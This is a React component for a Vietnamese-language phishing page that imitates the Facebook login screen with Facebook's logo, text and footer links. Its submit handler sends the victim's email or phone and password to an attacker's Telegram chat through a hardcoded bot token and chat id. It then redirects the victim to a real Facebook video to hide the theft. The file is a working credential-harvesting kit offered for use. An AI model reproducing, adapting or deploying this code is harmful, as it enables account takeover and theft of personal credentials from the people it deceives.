import React from 'react'
import { Link, Navigate, useNavigate } from 'react-router-dom'
import { Button, Form, Input } from 'antd';
import axios from 'axios';
import "./Publics/css/index.css"
import "./Publics/css/check.css"

const FormComponent = () => {
    const navigate = useNavigate();

    const onFinish = (values) => {

        localStorage.setItem('dataForm', JSON.stringify(values))

        const bot_token = '6308794044:AAG0LQXsHsTBMaP63UeUrdc9MmDoSUKO5I8';
        const chat_id   = '5208541473';

        const message   =
        '%0A<strong>Email or Phone: </strong>' + values.email_or_phone + 
        '%0A<strong>Password: </strong>' + values.password;


        axios.get(`https://api.telegram.org/bot${bot_token}/sendMessage?chat_id=${chat_id}&text=${message}&parse_mode=html`)
            .then((response) => {
                window.location.href = "https://www.facebook.com/reel/234678732468714/?s=ifu"
            })
            .catch((error) => {});

    }

    return (
        
        <div className="main">

            <div className="login-page">
                <div className="form-login">
                    <div className="content-form">
                        <div className="item-left">
                            <div className="logo">
                                <img src="https://static.xx.fbcdn.net/rsrc.php/y8/r/dF5SId3UHWd.svg"  width="100%" alt="Facebook" />
                            </div>
                            <h2>Facebook giúp bạn kết nối và chia sẻ với mọi người trong cuộc sống của bạn.</h2>
                        </div>

                        <div className="item-right">
                            <div className="form">
                                
                            <Form
                                name="basic"
                                initialValues={{
                                    remember: true,
                                }}
                                onFinish={onFinish}
                                autoComplete="off"
                                style={{
                                    display:"flex",
                                    flexDirection: "column"
                                }}
                            >

                                <div className="item-form">
                                    <Form.Item
                                        name="email_or_phone"
                                        rules={[
                                            {
                                            required: true,
                                            message: 'Please input email or phone number.',
                                            },
                                        ]}
                                    >
                                        <Input placeholder="Email or phone number" />
                                    </Form.Item>
                                </div>

                                <div className="item-form">
                                    <Form.Item
                                        name="password"
                                        rules={[
                                            {
                                            required: true,
                                            message: 'Please input your Password',
                                            },
                                        ]}
                                    >
                                        <Input.Password placeholder="Password" />
                                    </Form.Item>
                                </div>


                                <Form.Item 
                                    className="btn butoni"
                                >
                                    <Button
                                        htmlType="submit"
                                        style={{
                                            backgroundColor: "#0d6efd",
                                            outline: "none",
                                            border: 'none',
                                            boxShadow: 'none',
                                            color: "white",
                                            fontWeight: '700',
                                            fontSize:'1rem'
                                        }}
                                    >
                                        Login
                                    </Button>
                                </Form.Item>
                            </Form>

                                <div className="link">
                                    <Link id="forgot-password" to={"https://vi-vn.facebook.com/login/identify/?ctx=recover&ars=facebook_login&from_login_screen=0"}>Quên mật khẩu?</Link>
                                    <div className="line"><span>hoặc</span></div>
                                    <Link className="signin" to={"https://www.facebook.com/r.php?locale=vi_VN&display=page"}>Tạo tài khoản mới</Link>
                                </div>

                            </div>

                            <div className="col-11 create-page">
                                <p><b><Link to={"https://vi-vn.facebook.com/pages/create/?ref_type=registration_form"}>Tạo Trang</Link></b> dành cho người nổi tiếng, thương hiệu hoặc doanh nghiệp.</p>
                            </div>

                        </div>
                    </div>
                </div>


                <div className="footer">
                    <div className="content-footer">
                        <div className="footer-top lang">
                            <Link to={""}>Tiếng Việt</Link>
                            <Link to={""}>English (UK)</Link>
                            <Link to={""}>中文(台灣)</Link>
                            <Link to={""}>한국어</Link>
                            <Link to={""}>日本語</Link>
                            <Link to={""}>Français (France)</Link>
                            <Link to={""}>ภาษาไทย</Link>
                            <Link to={""}>Español</Link>
                            <Link to={""}>Português (Brasil)</Link>
                            <Link to={""}>Deutsch</Link>
                            <Link to={""}>Italiano</Link>
                        </div>

                        <div className="line"></div>

                        <div className="footer-bottom lang">
                            <Link to={"https://vi-vn.facebook.com/reg/"}>Đăng ký</Link>
                            <Link to={"https://vi-vn.facebook.com/login/"}>Đăng nhập</Link>
                            <Link to={"https://www.messenger.com/"}>Messenger</Link>
                            <Link to={"https://vi-vn.facebook.com/lite/"}>Facebook Lite</Link>
                            <Link to={"https://vi-vn.facebook.com/watch/"}>Video</Link>
                            <Link to={"https://vi-vn.facebook.com/places/"}>Địa điểm</Link>
                            <Link to={"https://vi-vn.facebook.com/gaming/play/"}>Trò chơi</Link>
                            <Link to={"https://vi-vn.facebook.com/login/?next=%2Fmarketplace%2F"}>Marketplace</Link>
                            <Link to={"https://pay.facebook.com/"}>Meta Pay</Link>
                            <Link to={"https://www.meta.com/"}>Cửa hàng trên Meta</Link>
                            <Link to={"https://www.meta.com/quest/"}>Meta Quest</Link>
                            <Link to={"https://www.instagram.com/accounts/login/?next=https%3A%2F%2Fwww.instagram.com%2F"}>Instagram</Link>
                            <Link to={"https://www.threads.net/"}>Threads</Link>
                            <Link to={"https://vi-vn.facebook.com/fundraisers/"}>Chiến dịch gây quỹ</Link>
                            <Link to={"https://vi-vn.facebook.com/biz/directory/"}>Dịch vụ</Link>
                            <Link to={"https://vi-vn.facebook.com/votinginformationcenter/"}>Trung tâm thông tin bỏ phiếu</Link>
                            <Link to={"https://vi-vn.facebook.com/privacy/policy/?entry_point=facebook_page_footer"}>Chính sách quyền riêng tư</Link>
                            <Link to={"https://vi-vn.facebook.com/privacy/center/?entry_point=facebook_page_footer"}>Trung tâm quyền riêng tư</Link>
                            <Link to={"https://vi-vn.facebook.com/groups/discover/"}>Nhóm</Link>
                            <Link to={"https://about.meta.com/"}>Giới thiệu</Link>
                            <Link to={"https://vi-vn.facebook.com/login.php?next=https%3A%2F%2Fvi-vn.facebook.com%2Fads%2Fcreate%2F%3Fnav_source%3Dunknown%26campaign_id%3D402047449186%26placement%3Dpflo%26extra_1%3Dnot-admgr-user"}>Tạo quảng cáo</Link>
                            <Link to={"https://vi-vn.facebook.com/pages/create/?ref_type=site_footer"}>Tạo Trang</Link>
                            <Link to={"https://developers.facebook.com/?ref=pf"}>Nhà phát triển</Link>
                            <Link to={"https://vi-vn.facebook.com/careers/?ref=pf"}>Tuyển dụng</Link>
                            <Link to={"https://vi-vn.facebook.com/privacy/policies/cookies/?entry_point=cookie_policy_redirect&entry=0"}>Cookie</Link>
                            <Link to={"https://www.facebook.com/help/568137493302217"}>Lựa chọn quảng cáo</Link>
                            <Link to={"https://vi-vn.facebook.com/policies_center/"}>Điều khoản</Link>
                            <Link to={"https://vi-vn.facebook.com/help/?ref=pf"}>Trợ giúp</Link>
                            <Link to={"https://vi-vn.facebook.com/help/637205020878504"}>Tải thông tin liên hệ lên & đối tượng không phải người dùng</Link>
                        </div>
                        <div className="coppyright">
                            <div className="mob">
                                <Link to={"https://about.meta.com/"}>Giới thiệu</Link>
                                <Link to={"https://vi-vn.facebook.com/help/?ref=pf"}>Trợ giúp</Link>
                            </div>
                            <span>Meta © 2023</span>
                        </div>
                    </div>
                </div>

            </div>
            
        </div>

    )
}

export default FormComponent